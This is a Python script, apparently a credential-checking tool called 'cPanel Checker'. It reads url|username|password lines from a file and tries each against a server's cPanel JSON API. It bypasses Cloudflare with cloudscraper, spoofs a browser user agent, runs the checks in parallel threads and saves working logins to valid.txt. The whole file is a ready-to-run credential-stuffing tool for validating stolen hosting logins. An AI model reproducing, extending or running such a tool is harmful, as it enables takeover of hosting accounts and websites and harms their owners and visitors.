import requests
import cloudscraper
import concurrent.futures
import os
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

logo = f"""{Fore.CYAN}
       ____                  _        ____ _               _             
   ___|  _ \ __ _ _ __   ___| |      / ___| |__   ___  ___| | _____ _ __ 
  / __| |_) / _` | '_ \ / _ \ |_____| |   | '_ \ / _ \/ __| |/ / _ \ '__|
 | (__|  __/ (_| | | | |  __/ |_____| |___| | | |  __/ (__|   <  __/ |   
  \___|_|   \__,_|_| |_|\___|_|      \____|_| |_|\___|\___|_|\_\___|_|   
                                                                         
{Style.RESET_ALL}           {Fore.GREEN} developer by Root_hex- CPanel Checker{Style.RESET_ALL}
"""

print(logo)

file_path = input(f"{Fore.CYAN}[?] Enter the file list name cPanel (.txt): {Style.RESET_ALL}")

if not os.path.exists(file_path):
    print(f"{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
    exit()

with open(file_path, "r", encoding="utf-8") as f:
    lines = [line.strip() for line in f.readlines() if line.strip()]

valid_accounts = []

scraper = cloudscraper.create_scraper()

def check_cpanel(line):
    try:
        parts = line.split("|")
        if len(parts) != 3:
            print(f"{Fore.RED}[SKIPPED] Incorrect format: {line}{Style.RESET_ALL}")
            return
        
        url, username, password = parts
        api_url = f"{url}/json-api/cpanel"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        }

        response = scraper.get(api_url, auth=(username, password), headers=headers, timeout=15)

        if response.status_code == 200 and "cpanel" in response.text.lower():
            print(f"{Fore.GREEN}[VALID] {url}|{username}|{password}{Style.RESET_ALL}")
            valid_accounts.append(f"{url}|{username}|{password}")
        else:
            print(f"{Fore.RED}[INVALID] {url}|{username}|{password}{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[ERROR] {line} - {e}{Style.RESET_ALL}")

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(check_cpanel, lines)

if valid_accounts:
    with open("valid.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(valid_accounts) + "\n")

print(f"\n{Fore.GREEN}✅ Inspection completed!{Style.RESET_ALL}")
print(f"{Fore.CYAN}✔ Results saved: valid.txt{Style.RESET_ALL}")
